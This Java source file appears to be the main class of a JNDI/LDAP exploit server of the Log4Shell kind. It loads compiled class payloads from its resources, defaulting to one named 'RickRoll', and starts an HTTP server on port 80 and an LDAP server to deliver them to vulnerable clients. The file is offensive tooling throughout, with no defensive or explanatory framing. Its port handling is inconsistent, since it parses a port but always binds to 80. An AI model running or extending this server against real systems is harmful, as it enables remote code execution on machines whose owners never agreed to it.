package itzbenz;

import com.sun.net.httpserver.HttpServer;

import java.util.Objects;

public class Main {
    public static String address = "localhost";
    public static int port = 80;
    static String defaultPayload = "itzbenz.payload.RickRoll";

    public static void main(String[] args) throws Exception {
        if (args.length != 0) {
            address = args[0];
        }
        if (address.split(":").length == 2) {
            port = Integer.parseInt(address.split(":")[1]);
        }
        System.out.println("Using address as payload server: " + address + ":" + port);
        //payload
        getPayload(defaultPayload);
        System.err.println("Found default payload: " + defaultPayload);
        //webserver
        HttpServer server;
        try {
            System.out.println("Starting http server on port: " + port);
            server = HttpServer.create(new java.net.InetSocketAddress("0.0.0.0", 80), 0);
            server.createContext("/", new RequestHandler());
        } catch (java.io.IOException e) {
            e.printStackTrace();
            return;
        }
        server.start();
        //LDAP server

        new LDAPServer().start();
    }

    public static boolean payloadExists(String payload) {
        try {
            payload = payload.replace('.', '/');
            payload = payload.endsWith(".class") ? payload : payload + ".class";
            Objects.requireNonNull(Main.class.getClassLoader().getResourceAsStream(payload)).readAllBytes();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public static byte[] getPayload(String payload) {
        payload = payload.endsWith(".class") ? payload.substring(0, payload.length() - 6) : payload;
        payload = payload.replace('.', '/');
        payload = payload.endsWith(".class") ? payload : payload + ".class";
        payload = payload.startsWith("/") ? payload : '/' + payload;
        try {
            return Objects.requireNonNull(Main.class.getResourceAsStream(payload)).readAllBytes();
        } catch (Exception e) {
            if (payload.equals(defaultPayload)) {
                throw new RuntimeException("Could not find default payload: " + payload);//really
            }
            System.err.println("Could not find payload: '" + payload + "', Trying to use default: " + defaultPayload);
            return getPayload(defaultPayload);
        }
    }
}
